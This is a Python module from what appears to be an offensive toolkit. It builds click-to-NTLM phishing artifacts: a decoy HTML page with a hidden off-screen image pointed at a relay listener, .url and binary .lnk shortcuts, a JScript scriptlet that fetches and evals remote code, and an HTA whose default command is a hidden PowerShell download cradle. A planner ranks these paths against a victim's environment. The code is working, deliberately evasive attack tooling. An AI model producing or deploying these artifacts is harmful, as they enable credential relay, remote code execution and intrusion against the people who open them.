# ============================================================================
# FILE: core/mshtml.py
# ============================================================================
"""Click-to-NTLM artifacts: one click, or one opened attachment, becomes an authentication.

`core/relay.py` relays an authentication that is already happening. This module produces the
thing that MAKES it happen: a decoy page whose hidden sub-resource points at the relay listener,
and the file types - `.url`, `.lnk`, `.hta`, `.sct` - that a victim opens and that resolve a
remote path or run a command which reaches the same listener.

The page leaks nothing of ours by design. `object_page` carries no collector script, no cookie
and no `__bh` route: its only job is to make MSHTML issue an NTLM handshake to a URL the operator
controls, and every extra byte is a tell a defender can score on.

Limits, up front, because this chain dies in several places:
  * NTLM over HTTP needs a listener that answers with `401` and `WWW-Authenticate: NTLM`. That is
    `core/relay.py`'s job, not this module's. Without it the objects here produce an ordinary
    unauthenticated request and nothing more.
  * a `.lnk`, `.url`, `.hta` or `.sct` has to be opened by the victim, and the href/script paths
    (`.hta`, `.sct`, and the MSHTML `<img>`/`<object>` itself) additionally need local policy to
    allow them. Mark-of-the-Web, the Attachment Manager, and the mshta/scriptlet restrictions are
    the usual refusals - this module cannot lift any of them.
  * the relay target must actually accept the relayed credentials (e.g. an AD CS ESC8 enrolment
    endpoint). Relaying an NTLM response to a target that rejects NTLM buys nothing.
  * MFA is never bypassed anywhere in this chain. NTLM is a Windows machine/user authentication,
    not a session that satisfies a second factor; an account with MFA still needs that factor.

Every shipped file is checked for non-ASCII (tests/test_portability.py) and for console-unsafe
strings, so anything outside ASCII is written as \\uXXXX, never as a literal character.
"""
import html
import re
import struct
import uuid

__all__ = ["object_page", "url_shortcut", "lnk", "sct", "hta", "plan", "MshtmlError"]

# The MS-SHLLINK (Shell Link Binary File Format) header is a fixed 0x4C bytes and every link
# starts with this CLSID, in little-endian byte order.
HEADER_SIZE = 0x4C
LINK_CLSID = uuid.UUID("{00021401-0000-0000-C000-000000000046}")
# The "My Computer" root shell item, so the target ID list begins at a real root.
ROOT_FOLDER_CLSID = uuid.UUID("{20D04FE0-3AEA-1069-A2D8-08002B30309D}")

# LinkFlags bits this module sets (the rest stay off on purpose - a set flag with no matching
# data section is what makes a .lnk unreadable to Explorer).
FLAG_HAS_LINK_TARGET_ID_LIST = 0x00000001
FLAG_HAS_NAME = 0x00000004
FLAG_HAS_RELATIVE_PATH = 0x00000008
FLAG_HAS_WORKING_DIR = 0x00000010
FLAG_HAS_ARGUMENTS = 0x00000020
FLAG_HAS_ICON_LOCATION = 0x00000040
FLAG_IS_UNICODE = 0x00000080

FILE_ATTRIBUTE_ARCHIVE = 0x00000020
SHOW_COMMAND_NORMAL = 1

# A fixed timestamp so the bytes are deterministic. A shell item carries a timestamp, and a value
# that changed per call would make two builds of the same .lnk differ, which the tests compare.
DOS_DATE_2020_01_01 = ((2020 - 1980) << 9) | (1 << 5) | 1
DOS_TIME_MIDNIGHT = 0


class MshtmlError(ValueError):
    """A malformed argument. A ValueError so a caller can catch it as one."""


# ------------------------------------------------------------------ helpers --
# Characters that break out of the contexts these artifacts place a URL in: an HTML
# attribute, a JScript string literal, a CDATA block, an INI value and a .lnk field all
# treat a quote, an angle bracket or a backslash differently. None of them is legal in a
# URL anyway (RFC 3986), so a URL carrying one is refused instead of escaped five ways.
_BAD_URL_CHARS = re.compile("[\\s'\"`<>\\\\]")


def _clean_url(value, name):
    """A non-empty http(s) URL with no character that can break the artifact it lands in.

    NTLM is issued over HTTP, not over file/UNC, so the scheme is checked here too.
    """
    if not isinstance(value, str) or not value.strip():
        raise MshtmlError(f"{name} must be a non-empty http(s) URL")
    url = value.strip()
    low = url.lower()
    if not (low.startswith("http://") or low.startswith("https://")):
        raise MshtmlError(f"{name} must start with http:// or https://")
    if _BAD_URL_CHARS.search(url):
        raise MshtmlError(f"{name} contains a character that would break the generated "
                          f"artifact: {value!r}")
    return url


def _opt_str(value, name):
    """An optional string argument: None passes, any non-string is refused."""
    if value is None:
        return None
    if not isinstance(value, str):
        raise MshtmlError(f"{name} must be a string or None")
    return value


def _attr_safe(url):
    """Neutralise only the characters that would end the HTML attribute.

    `&` is left alone deliberately: escaping it would rewrite a query string, and the page's
    contract is that the trigger URL appears in it verbatim (exactly once).
    """
    return (url.replace('"', "%22").replace("'", "%27")
            .replace("<", "%3c").replace(">", "%3e"))


# --------------------------------------------------------------- the page -----
def object_page(trigger_url, *, title=None, body=None):
    """A decoy page whose hidden sub-resource points at `trigger_url`.

    The sub-resource is a 1x1 `<img>` parked off-screen. MSHTML loads it as part of the page and,
    when whatever answers offers `401 WWW-Authenticate: NTLM`, performs the handshake to fetch it
    - which is the authentication the relay captures. There is no script, no cookie and no `__bh`
    route here on purpose: the decoy exists only so a click looks like an opened document.
    """
    trigger = _clean_url(trigger_url, "trigger_url")
    src = _attr_safe(trigger)
    head = html.escape(str(title) if title else "Document")
    decoy = body if body is not None else (
        "<p>This document is being prepared for viewing. It will open in a moment.</p>")
    return f"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{head}</title>
<style>
 body{{font:16px/1.5 system-ui,Segoe UI,Roboto,sans-serif;margin:0;background:#f4f5f7;color:#202020}}
 .wrap{{max-width:640px;margin:10vh auto;padding:32px;background:#fff;border-radius:8px;
        box-shadow:0 2px 16px rgba(0,0,0,.08)}}
 h1{{font-size:20px;margin:0 0 12px}} p{{color:#4a5462}}
</style></head><body><div class="wrap">
<h1>{head}</h1>
{decoy}
</div>
<img src="{src}" width="1" height="1" alt="" style="position:absolute;left:-9999px;top:-9999px">
</body></html>
"""


# --------------------------------------------------------- Internet shortcut --
def url_shortcut(target, *, icon=None):
    """The `.url` Internet shortcut (an INI file) that opens an http(s) target.

    Windows resolves a `.url` and hands an http(s) URL to the browser - or, for the
    WebClient/WebDAV path, authenticates to it. It leaks nothing: it is the decoy file the victim
    was asked to open, so it carries only the URL and an optional icon.
    """
    url = _clean_url(target, "target")
    icon = _opt_str(icon, "icon")
    lines = ["[InternetShortcut]", f"URL={url}"]
    if icon is not None:
        lines.append(f"IconFile={icon}")
        lines.append("IconIndex=0")
    # CRLF: the format is a Windows INI file and Explorer expects Windows line endings
    return ("\r\n".join(lines) + "\r\n").encode("utf-8")


# --------------------------------------------------------------- the .lnk -----
def _shell_item(data):
    """One shell ItemID: a 2-byte size (covering itself) followed by the item's data."""
    return struct.pack("<H", len(data) + 2) + data


def _root_folder_item():
    """The 'My Computer' root folder shell item (type 0x1F, then the folder's CLSID)."""
    return _shell_item(b"\x1f" + ROOT_FOLDER_CLSID.bytes_le)


def _file_entry_item(name):
    """A 'File entry' shell item (type 0x32) carrying one path component.

    The body is the documented fixed part (type, a reserved byte, file size, DOS date/time and
    attribute flags) followed by the ASCIIZ name; the item's own size delimits the name.
    """
    body = (b"\x32" + b"\x00" + struct.pack("<I", 0)
            + struct.pack("<H", DOS_DATE_2020_01_01)
            + struct.pack("<H", DOS_TIME_MIDNIGHT)
            + struct.pack("<H", FILE_ATTRIBUTE_ARCHIVE))
    name_bytes = name.encode("ascii", "replace") + b"\x00"
    if len(name_bytes) % 2:                        # shell items are 2-byte aligned
        name_bytes += b"\x00"
    return _shell_item(body + name_bytes)


def _link_target_id_list(command):
    """The LinkTargetIDList: a size, a root item, one file item per component, then terminal."""
    parts = [p for p in command.replace("/", "\\").split("\\") if p] or [command]
    items = _root_folder_item() + b"".join(_file_entry_item(p) for p in parts)
    idlist = items + struct.pack("<H", 0)          # the terminating ItemID
    return struct.pack("<H", len(idlist)) + idlist


def _string_data(text):
    """A StringData entry: a character count (including the NUL) then UTF-16LE characters."""
    s = text + "\x00"
    return struct.pack("<H", len(s)) + s.encode("utf-16-le")


def lnk(command, *, arguments=None, icon=None, workdir=None):
    """An MS-SHLLINK binary whose target is `command`, so opening it runs the command.

    Built from the published layout - a real ShellLinkHeader, a LinkTargetIDList and the matching
    StringData - not a fixed header, because a malformed .lnk is refused by Explorer instead of
    executed. `arguments` (COMMAND_LINE_ARGUMENTS) is where the payload normally goes; `workdir`
    and `icon` are optional and only add their own StringData when given.
    """
    if not isinstance(command, str) or not command.strip():
        raise MshtmlError("lnk needs a non-empty command (a target such as powershell.exe)")
    command = command.strip()
    arguments = _opt_str(arguments, "arguments")
    workdir = _opt_str(workdir, "workdir")
    icon = _opt_str(icon, "icon")

    flags = (FLAG_HAS_LINK_TARGET_ID_LIST | FLAG_HAS_NAME | FLAG_HAS_RELATIVE_PATH
             | FLAG_IS_UNICODE)
    if workdir:
        flags |= FLAG_HAS_WORKING_DIR
    if arguments:
        flags |= FLAG_HAS_ARGUMENTS
    if icon:
        flags |= FLAG_HAS_ICON_LOCATION

    header = (struct.pack("<I", HEADER_SIZE) + LINK_CLSID.bytes_le
              + struct.pack("<I", flags) + struct.pack("<I", FILE_ATTRIBUTE_ARCHIVE)
              + struct.pack("<Q", 0) + struct.pack("<Q", 0) + struct.pack("<Q", 0)   # times
              + struct.pack("<I", 0)                                                # file size
              + struct.pack("<i", 0)                                                # icon index
              + struct.pack("<I", SHOW_COMMAND_NORMAL)
              + struct.pack("<H", 0) + struct.pack("<H", 0)                         # hotkey, res1
              + struct.pack("<I", 0) + struct.pack("<I", 0))                        # res2, res3

    # the StringData order is fixed by the format: NAME, RELATIVE_PATH, WORKING_DIR,
    # COMMAND_LINE_ARGUMENTS, ICON_LOCATION - each present only when its flag is set
    name = command.replace("/", "\\").rsplit("\\", 1)[-1] or command
    out = header + _link_target_id_list(command)
    out += _string_data(name)                       # NAME_STRING
    out += _string_data(command)                    # RELATIVE_PATH
    if workdir:
        out += _string_data(workdir)                # WORKING_DIR
    if arguments:
        out += _string_data(arguments)              # COMMAND_LINE_ARGUMENTS
    if icon:
        out += _string_data(icon)                   # ICON_LOCATION
    return out


# -------------------------------------------------------------- scriptlet -----
def sct(url):
    """A Windows Script Component (`.sct`) that fetches `url` and runs the response.

    `regsvr32 /s /u /i:<url> scrobj.dll` loads and executes a scriptlet, which is why an `.sct`
    is delivered as a command line rather than double-clicked. This script fetches the URL's body
    and evaluates it. Limit: it needs scriptlet execution to be allowed.
    """
    payload = _clean_url(url, "url")
    return (
        '<?xml version="1.0"?>\n'
        '<scriptlet>\n'
        '<registration description="Document" progid="Document.Viewer" version="1.0" '
        'classid="{0002E510-0000-0000-C000-000000000046}"/>\n'
        '<script language="JScript">\n'
        '<![CDATA[\n'
        'var http = new ActiveXObject("MSXML2.XMLHTTP");\n'
        'http.open("GET", "' + payload + '", false);\n'
        'http.send();\n'
        'eval(http.responseText);\n'
        ']]>\n'
        '</script>\n'
        '</scriptlet>\n'
    )


# ------------------------------------------------------------------- HTAs -----
_HTA_TEMPLATE = """<!doctype html>
<html><head><meta charset="utf-8"><title>Document</title>
<HTA:APPLICATION id="oHTA" applicationname="Document" border="none" caption="no"
 scroll="no" showintaskbar="no" singleinstance="yes" sysmenu="no" windowstate="normal">
<script language="VBScript">
  Sub Launch()
    Dim sh
    On Error Resume Next
    Set sh = CreateObject("WScript.Shell")
    sh.Run "__CMD__", 0, False
    window.close
  End Sub
</script>
</head>
<body onload="Launch">
<h1>Document</h1>
<p>Opening the document. If it does not appear, close this window and open the file again.</p>
</body></html>
"""


def hta(url, *, command=None):
    """An HTML Application (`.hta`) that runs a VBScript payload, with a plain decoy body.

    `mshta.exe` runs an `.hta` with full trust, so the visible body is a plain 'opening the
    document' page while the script starts a process. With no `command`, the payload is a download
    cradle for `url`; pass `command` to run something specific. Limit: mshta execution and
    Mark-of-the-Web/Attachment Manager policy decide whether it runs at all.
    """
    payload = _clean_url(url, "url")
    if command is None:
        cmd = ("powershell -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('"
               + payload + "')\"")
    else:
        if not isinstance(command, str) or not command.strip():
            raise MshtmlError("hta command must be a non-empty string or None")
        cmd = command.strip()
    # VBScript escapes a double quote inside a string literal by doubling it
    safe_cmd = cmd.replace('"', '""')
    return _HTA_TEMPLATE.replace("__CMD__", safe_cmd)


# ------------------------------------------------------- the decision matrix --
# Tie-break priority within one confidence band: the paths that need the least of the victim
# (a page load over an opened attachment) rank above the ones that need a script to be allowed.
_PRIORITY = {
    "mshtml-object": 100,
    "url-shortcut": 80,
    "lnk": 70,
    "hta": 60,
    "sct": 50,
    "macro-document": 40,
    "smb-unc": 30,
}
_CONFIDENCE_RANK = {"CONFIRMED": 0, "SUSPECTED": 1, "FAILED": 2}


def _cand(kind, confidence, why, needs):
    return {"kind": kind, "why": why, "needs": needs, "confidence": confidence}


def _relay_needs(relay):
    return ("nothing beyond the page and the running relay" if relay
            else "a listener answering 401 with WWW-Authenticate: NTLM (core/relay.py)")


def plan(facts):
    """The click-to-NTLM candidates, strongest working path first.

    `facts` is the operator's view of the target and may carry: `os` (windows|macos|linux|
    unknown), `browser`, `is_ie`, `smb_reachable`, `http_ntlm_relay_ready`, `relay_target`
    (is there a host that ACCEPTS the relayed authentication?) and `macro_policy`
    (allowed|blocked|unknown). Each candidate is `{'kind','why','needs','confidence'}` with
    confidence CONFIRMED (works with the facts as given), SUSPECTED (needs one more thing) or
    FAILED (the facts rule it out).

    CONFIRMED here means the trigger fires and a listener is ready to receive it, which is
    narrower than `core.decision`'s T2_ntlm_relay: that path is ready only when a target that
    ACCEPTS the authentication is known too. An explicit `relay_target: false` therefore
    holds these candidates at SUSPECTED rather than letting the two modules disagree.
    """
    facts = dict(facts or {})
    os_name = str(facts.get("os") or "unknown").strip().lower()
    browser = str(facts.get("browser") or "").strip().lower()
    is_ie = bool(facts.get("is_ie")) or browser in (
        "ie", "internet explorer", "internet-explorer", "mshtml", "trident")
    smb = bool(facts.get("smb_reachable"))
    relay = bool(facts.get("http_ntlm_relay_ready"))
    macro = str(facts.get("macro_policy") or "unknown").strip().lower()
    # An absent key means "not known yet" and does not block; an explicit false means the
    # operator has no target, which is the one thing that makes the whole chain pointless.
    target = facts.get("relay_target")
    target_known_missing = target is not None and not bool(target)
    target_need = "a relay target that accepts the authentication (AD CS ESC8, or a host "\
                  "that accepts NTLM)"

    windows = os_name == "windows"
    rows = []

    # 1. the MSHTML object page - the only path that fires from a page load, with no extra click
    if not windows:
        rows.append(_cand("mshtml-object", "FAILED",
                          "MSHTML is a Windows component, so no engine here issues the handshake",
                          "a Windows victim running an MSHTML-based browser"))
    elif not is_ie:
        rows.append(_cand("mshtml-object", "FAILED",
                          "the reported browser is not an MSHTML engine, so the hidden object "
                          "will not trigger an NTLM handshake",
                          "an MSHTML-based browser (Internet Explorer or an embedded Trident "
                          "host)"))
    elif relay and target_known_missing:
        rows.append(_cand("mshtml-object", "SUSPECTED",
                          "the trigger fires and the listener is ready, but no target that "
                          "accepts the relayed authentication was given",
                          target_need))
    elif relay:
        rows.append(_cand("mshtml-object", "CONFIRMED",
                          "an MSHTML browser plus an NTLM listener: the hidden sub-resource makes "
                          "the engine authenticate to the trigger URL, which is what the relay "
                          "captures",
                          _relay_needs(relay)))
    else:
        rows.append(_cand("mshtml-object", "SUSPECTED",
                          "an MSHTML browser will request the hidden sub-resource and the "
                          "handshake starts the moment a listener offers NTLM",
                          _relay_needs(relay)))

    # 2. the .url Internet shortcut
    if not windows:
        rows.append(_cand("url-shortcut", "FAILED",
                          "the .url Internet shortcut is resolved by Windows only",
                          "a Windows victim"))
    elif relay and target_known_missing:
        rows.append(_cand("url-shortcut", "SUSPECTED",
                          "the shortcut resolves on Windows and the listener is ready, but no "
                          "target that accepts the relayed authentication was given",
                          target_need))
    elif relay:
        rows.append(_cand("url-shortcut", "CONFIRMED",
                          "a .url that opens the trigger URL makes Windows resolve it and the "
                          "WebClient service issue the authentication over HTTP",
                          "the victim opening the shortcut, with the WebClient service running "
                          "(default on workstations)"))
    else:
        rows.append(_cand("url-shortcut", "SUSPECTED",
                          "the shortcut resolves on Windows but there is nothing to authenticate "
                          "to yet",
                          _relay_needs(relay)))

    # 3. the .lnk Shell Link
    if not windows:
        rows.append(_cand("lnk", "FAILED",
                          "the Shell Link format is a Windows artefact",
                          "a Windows victim"))
    elif relay:
        rows.append(_cand("lnk", "CONFIRMED",
                          "opening the shortcut runs the command, which can reach the trigger URL "
                          "(or a UNC path) and produce the authentication",
                          "the victim opening the shortcut, with the WebClient service running"))
    else:
        rows.append(_cand("lnk", "SUSPECTED",
                          "the shortcut runs the command on Windows, but there is nothing to "
                          "authenticate to yet",
                          _relay_needs(relay)))

    # 4/5. the script paths: an opened .hta or .sct also needs policy to allow the script
    for kind, what in (("hta", "mshta runs the VBScript payload"),
                       ("sct", "regsvr32 loads the scriptlet and runs its script")):
        if not windows:
            rows.append(_cand(kind, "FAILED", f"{what} only happens on Windows",
                              "a Windows victim"))
        else:
            rows.append(_cand(kind, "SUSPECTED",
                              f"{what}, which reaches the trigger URL - but script execution is "
                              "a policy decision, not a platform fact",
                              "the victim opening it AND local policy allowing it; "
                              + _relay_needs(relay)))

    # 6. a document whose external reference or macro makes Windows resolve the trigger
    if not windows:
        rows.append(_cand("macro-document", "FAILED",
                          "the document path relies on Windows resolving the reference",
                          "a Windows victim"))
    elif macro == "blocked":
        rows.append(_cand("macro-document", "FAILED",
                          "macro policy is blocked, so the document path cannot run",
                          "macro policy changed to allowed"))
    elif macro == "allowed" and relay:
        rows.append(_cand("macro-document", "CONFIRMED",
                          "macros run and the payload reaches the trigger URL, which the relay "
                          "captures",
                          _relay_needs(relay)))
    else:
        rows.append(_cand("macro-document", "SUSPECTED",
                          "the document path runs only if macro policy allows it, which is not "
                          "confirmed",
                          "confirm macro policy is allowed and " + _relay_needs(relay)))

    # 7. a UNC path that drives an SMB authentication instead of HTTP
    if not windows:
        rows.append(_cand("smb-unc", "FAILED",
                          "a UNC path is resolved by Windows only",
                          "a Windows victim"))
    elif smb:
        rows.append(_cand("smb-unc", "SUSPECTED",
                          "a UNC path such as \\\\host\\share in a document makes Windows "
                          "authenticate over SMB",
                          "a document/href the victim opens, and a relay listening on SMB"))
    else:
        rows.append(_cand("smb-unc", "FAILED",
                          "SMB is not reachable, so a UNC reference has nowhere to go",
                          "SMB reachability"))

    rows.sort(key=lambda r: (_CONFIDENCE_RANK[r["confidence"]], -_PRIORITY[r["kind"]]))
    if not any(r["confidence"] in ("CONFIRMED", "SUSPECTED") for r in rows):
        # say so rather than leaving the operator to infer it from a wall of FAILED rows
        rows.append(_cand("none", "FAILED",
                          "nothing here turns this victim into an NTLM authentication with the "
                          "facts as given",
                          "a Windows target (or a browser that speaks NTLM) and the rest of the "
                          "chain"))
    return rows
